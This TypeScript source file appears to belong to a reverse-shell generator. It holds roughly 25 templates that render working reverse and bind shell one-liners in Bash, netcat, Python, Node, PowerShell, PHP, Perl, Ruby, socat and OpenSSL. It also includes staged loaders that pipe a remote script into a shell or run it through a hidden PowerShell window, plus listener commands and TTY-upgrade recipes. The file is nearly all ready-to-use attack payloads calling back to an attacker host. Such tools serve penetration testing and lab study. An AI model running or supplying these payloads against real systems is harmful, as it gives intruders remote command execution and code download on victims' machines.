import type {
  ListenerTemplate,
  ReverseShellConfig,
  ReverseShellTemplate,
  UpgradeRecipe,
} from "./types";

function q(value: string): string {
  return value.replace(/'/g, `'\\''`);
}

export const reverseShellTemplates: ReverseShellTemplate[] = [
  {
    id: "bash-dev-tcp",
    name: "Bash /dev/tcp",
    family: "bash",
    platform: "linux",
    description: "Classic Bash TCP redirection one-liner.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport, shell }) =>
      `${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
  },
  {
    id: "bash-fd-196",
    name: "Bash FD 196",
    family: "bash",
    platform: "linux",
    description: "Bash reverse shell using an explicit file descriptor.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; ${shell} <&196 >&196 2>&196`,
  },
  {
    id: "nc-mkfifo",
    name: "Netcat mkfifo",
    family: "nc",
    platform: "linux",
    description: "Works with netcat builds that do not expose -e.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
  },
  {
    id: "nc-e",
    name: "Netcat -e",
    family: "nc",
    platform: "multi",
    description: "Shortest netcat variant when -e is available.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) => `nc -e ${shell} ${lhost} ${lport}`,
  },
  {
    id: "python3-socket",
    name: "Python 3 socket",
    family: "python",
    platform: "multi",
    description: "Python reverse shell with stdio duplicated to the socket.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
  },
  {
    id: "nodejs-child-process",
    name: "Node.js child_process",
    family: "node",
    platform: "multi",
    description: "Node.js reverse shell using net and child_process.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `node -e "const net=require('net'),cp=require('child_process'),sh=cp.spawn('${q(shell)}',['-i']);const c=new net.Socket();c.connect(${lport},'${lhost}',()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"`,
  },
  {
    id: "java-runtime",
    name: "Java Runtime",
    family: "java",
    platform: "multi",
    description:
      "Java reverse shell using Runtime.exec and socket redirection.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `java -e 'var s=new java.net.Socket("${lhost}",${lport});var p=new java.lang.ProcessBuilder(new String[]{"${q(shell)}","-i"}).redirectInput(s.getInputStream()).redirectOutput(s.getOutputStream()).redirectError(s.getOutputStream()).start();p.waitFor();'`,
  },
  {
    id: "golang-tcp",
    name: "Go TCP reverse shell",
    family: "go",
    platform: "multi",
    description:
      "Go reverse shell compiled as a one-liner for targets with Go.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go`,
  },
  {
    id: "zsh-dev-tcp",
    name: "Zsh /dev/tcp",
    family: "bash",
    platform: "linux",
    description: "Zsh reverse shell using /dev/tcp redirection.",
    defaultShell: "/bin/zsh",
    render: ({ lhost, lport, shell }) =>
      `zsh -c '${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
  },
  {
    id: "powershell-iex",
    name: "PowerShell IEX",
    family: "powershell",
    platform: "windows",
    description: "PowerShell reverse shell using Invoke-Expression over TCP.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);IEX $d 2>&1|Out-String|%{Write-Host $_};$r=[Text.Encoding]::ASCII.GetBytes($_+'PS '+(pwd).Path+'> ');$s.Write($r,0,$r.Length)};$c.Close()`,
  },
  {
    id: "powershell-downloadstring",
    name: "PowerShell DownloadString",
    family: "staged",
    platform: "windows",
    description:
      "Staged PowerShell loader that pulls a script from your HTTP server.",
    defaultShell: "powershell.exe",
    render: ({ lhost, httpPort, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${httpPort ?? lport}/rs.ps1')"`,
  },
  {
    id: "msfvenom-bash",
    name: "msfvenom Bash",
    family: "bash",
    platform: "linux",
    description:
      "Generate a Metasploit Bash payload locally, then run the output on the target.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_bash LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "awk-tcp",
    name: "awk TCP",
    family: "awk",
    platform: "linux",
    description: "awk reverse shell for systems with /inet/tcp support.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(42){do{printf "shell> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'`,
  },
  {
    id: "lua-socket",
    name: "LuaSocket",
    family: "lua",
    platform: "multi",
    description: "Lua reverse shell using the LuaSocket module.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `lua -e 'local s=require("socket");local c=s.tcp();c:connect("${lhost}",${lport});while true do local r,x=c:receive();local f=io.popen(r,"r");local b=f:read("*a");c:send(b);end'`,
  },
  {
    id: "php-proc-open",
    name: "PHP proc_open",
    family: "php",
    platform: "multi",
    description: "PHP one-liner for web RCE contexts.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});proc_open("${q(shell)} -i", array(0=>$s, 1=>$s, 2=>$s),$p);'`,
  },
  {
    id: "perl-socket",
    name: "Perl socket",
    family: "perl",
    platform: "multi",
    description: "Perl reverse shell using Socket from the standard library.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"${lhost}:${lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system("${q(shell)} -i");'`,
  },
  {
    id: "ruby-socket",
    name: "Ruby socket",
    family: "ruby",
    platform: "multi",
    description: "Ruby reverse shell using TCPSocket.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${lhost}","${lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: "socat-pty",
    name: "Socat PTY",
    family: "socat",
    platform: "linux",
    description: "Socat reverse shell that starts with a PTY-friendly process.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport, shell }) =>
      `socat exec:'${q(shell)} -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`,
  },
  {
    id: "openssl-fifo",
    name: "OpenSSL FIFO",
    family: "openssl",
    platform: "linux",
    description: "TLS reverse shell using openssl s_client and a named pipe.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm -f /tmp/rs;mkfifo /tmp/rs;${shell} -i < /tmp/rs 2>&1 | openssl s_client -quiet -connect ${lhost}:${lport} > /tmp/rs;rm /tmp/rs`,
  },
  {
    id: "busybox-nc-e",
    name: "BusyBox nc -e",
    family: "nc",
    platform: "linux",
    description: "BusyBox netcat reverse shell for compact Linux environments.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `busybox nc ${lhost} ${lport} -e ${shell}`,
  },
  {
    id: "telnet-mkfifo",
    name: "Telnet mkfifo",
    family: "telnet",
    platform: "linux",
    description: "Telnet reverse shell fallback using a named pipe.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm -f /tmp/p;mkfifo /tmp/p;${shell} -i < /tmp/p 2>&1 | telnet ${lhost} ${lport} > /tmp/p`,
  },
  {
    id: "powershell-tcp-client",
    name: "PowerShell TCPClient",
    family: "powershell",
    platform: "windows",
    description: "PowerShell reverse shell with an interactive command loop.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  },
  {
    id: "powershell-hoaxshell-style",
    name: "PowerShell HoaxShell-style",
    family: "powershell",
    platform: "windows",
    description:
      "HTTP polling PowerShell callback inspired by HoaxShell workflows.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "$u='http://${lhost}:${lport}';while($true){try{$r=iwr -UseBasicParsing $u;$c=$r.Content;if($c){$o=iex $c 2>&1 | Out-String;iwr -UseBasicParsing -Method POST -Body $o $u}}catch{};Start-Sleep -Seconds 2}"`,
  },
  {
    id: "bash-curl-staged",
    name: "Bash curl staged",
    family: "staged",
    platform: "linux",
    description:
      "Fetches a second-stage script from your HTTP server and pipes it to the shell.",
    defaultShell: "/bin/bash",
    render: ({ lhost, httpPort, lport, shell }) =>
      `curl -fsSL http://${lhost}:${httpPort ?? lport}/rs.sh | ${shell}`,
  },
  {
    id: "nc-bind-e",
    name: "Netcat bind -e",
    family: "bind",
    platform: "multi",
    description:
      "Bind shell for labs where inbound access to the target is available.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) => `nc -lvnp ${lport} -e ${shell}`,
  },
  {
    id: "python3-bind",
    name: "Python 3 bind shell",
    family: "bind",
    platform: "multi",
    description:
      "Python bind shell that listens on the target instead of calling back.",
    defaultShell: "/bin/sh",
    render: ({ lport, shell }) =>
      `python3 -c 'import os,socket,subprocess as p;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];p.call(["${shell}","-i"])'`,
  },
];

export const listenerTemplates: ListenerTemplate[] = [
  {
    id: "nc",
    name: "Netcat",
    description: "Simple TCP listener.",
    command: (lport) => `nc -lvnp ${lport}`,
  },
  {
    id: "rlwrap-nc",
    name: "rlwrap + netcat",
    description: "Adds readline history and line editing to netcat.",
    command: (lport) => `rlwrap -cAr nc -lvnp ${lport}`,
  },
  {
    id: "ncat-ssl",
    name: "Ncat SSL",
    description: "TLS listener for custom SSL-capable payloads.",
    command: (lport) => `ncat --ssl -lvnp ${lport}`,
  },
  {
    id: "socat-tty",
    name: "Socat TTY",
    description: "Listener configured for a stronger interactive TTY.",
    command: (lport) =>
      `socat file:\`tty\`,raw,echo=0 tcp-listen:${lport},reuseaddr`,
  },
  {
    id: "bind-connect",
    name: "Bind shell connect",
    description: "Connect to a bind shell already listening on the target.",
    command: (lport, lhost) => `nc -nv ${lhost} ${lport}`,
  },
  {
    id: "msfconsole",
    name: "Metasploit handler",
    description:
      "Bash reverse shell handler; match payload options before use.",
    command: (lport, lhost) =>
      `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_bash; set LHOST ${lhost}; set LPORT ${lport}; run'`,
  },
  {
    id: "openssl-server",
    name: "OpenSSL s_server",
    description: "Temporary TLS listener for openssl s_client payloads.",
    command: (lport) =>
      `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj '/CN=reverseshell' && openssl s_server -quiet -key key.pem -cert cert.pem -port ${lport}`,
  },
];

export const upgradeRecipes: UpgradeRecipe[] = [
  {
    id: "python-pty",
    name: "Python PTY upgrade",
    platform: "linux",
    description: "The most common upgrade path when Python is present.",
    steps: (shell) => [
      `python3 -c 'import pty; pty.spawn("${shell}")' || python -c 'import pty; pty.spawn("${shell}")'`,
      "Ctrl-Z",
      "stty raw -echo; fg",
      "reset",
      "export TERM=xterm-256color",
      "stty rows 40 columns 120",
    ],
  },
  {
    id: "script-tty",
    name: "script fallback",
    platform: "linux",
    description: "Useful on hosts without Python but with util-linux script.",
    steps: (shell) => [`script -qc ${shell} /dev/null`, "export TERM=xterm"],
  },
  {
    id: "socat-upgrade",
    name: "Socat full TTY",
    platform: "linux",
    description: "Best terminal behavior when socat exists on both ends.",
    steps: (shell, attackerHost, port) => [
      `Attacker: socat file:\`tty\`,raw,echo=0 tcp-listen:${port},reuseaddr`,
      `Target: socat exec:'${shell} -li',pty,stderr,setsid,sigint,sane tcp:${attackerHost}:${port}`,
    ],
  },
  {
    id: "windows-conpty",
    name: "Windows ConPTY note",
    platform: "windows",
    description: "Upgrade guidance for modern Windows shells.",
    steps: () => [
      "Use a ConPTY-aware payload/listener when possible.",
      "If only PowerShell is available, prefer ncat or PowerShell remoting for a stable interactive session.",
      "Set code page first if output is garbled: chcp 65001",
    ],
  },
];

export function getTemplate(templateId: string): ReverseShellTemplate {
  return (
    reverseShellTemplates.find((template) => template.id === templateId) ??
    reverseShellTemplates[0]
  );
}

export function defaultConfig(): ReverseShellConfig {
  const template = reverseShellTemplates[0];
  return {
    templateId: template.id,
    lhost: "10.10.14.3",
    lport: 4444,
    httpPort: 8000,
    shell: template.defaultShell,
    obfuscation: "none",
  };
}
